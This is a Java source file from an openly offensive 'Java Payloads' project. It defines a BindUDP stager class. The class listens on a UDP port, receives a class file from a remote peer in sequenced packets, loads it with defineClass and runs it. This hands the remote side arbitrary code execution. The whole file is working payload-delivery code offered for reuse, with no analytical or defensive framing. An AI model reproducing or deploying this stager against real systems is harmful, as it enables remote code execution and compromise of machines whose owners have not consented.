/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package javapayload.stager;


import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class BindUDP extends Stager {

	private boolean ready;

	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
		DatagramSocket ds = new DatagramSocket(Integer.parseInt(parameters[2]));
		synchronized(this) {
			ready = true;
			notifyAll();
		}
		DatagramPacket dp = new DatagramPacket(new byte[512], 512);
		ds.receive(dp);
		bootstrap(ds, dp.getAddress(), dp.getPort(), parameters);
	}
	
	private void bootstrap(DatagramSocket ds, InetAddress remoteAddress, int remotePort, String[] parameters) throws Exception {
		byte[] buffer = new byte[512];
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		int nextSequence = 0;
		while (true) {
			DatagramPacket dp = new DatagramPacket(buffer, 512);
			ds.receive(dp);
			if (dp.getLength() < 3 || buffer[0] != -1)
				continue;
			int sequence = ((buffer[1] & 0xff) << 8) | (buffer[2] & 0xff);
			if (sequence == nextSequence) {
				nextSequence++;
				if (dp.getLength() == 3) {
					break;
				} else {
					baos.write(buffer, 3, dp.getLength()-3);
				}
			} else if (sequence > nextSequence) {
				buffer[1] = (byte)(nextSequence >> 8);
				buffer[2] = (byte)nextSequence;
				ds.send(new DatagramPacket(buffer, 3, remoteAddress, remotePort));
			}
		}
		byte[] clazz = baos.toByteArray();
		PipedInputStream in = new PipedInputStream();
		PipedOutputStream pipedOut = new PipedOutputStream(in);
		OutputStream out = (OutputStream) defineClass(null, clazz, 0, clazz.length)
			.getConstructor(new Class[] {Class.forName("java.io.OutputStream"), Class.forName("java.net.DatagramSocket"), Class.forName("java.net.InetAddress"), Integer.TYPE})
			.newInstance(new Object[] {pipedOut, ds, remoteAddress, new Integer(remotePort)});
		bootstrap(in, out, parameters);
		out.getClass().getMethod("waitFinished", new Class[0]).invoke(out, new Object[0]);
	}
	
	public synchronized void waitReady() throws InterruptedException {
		while (!ready)
			wait();
	}
}
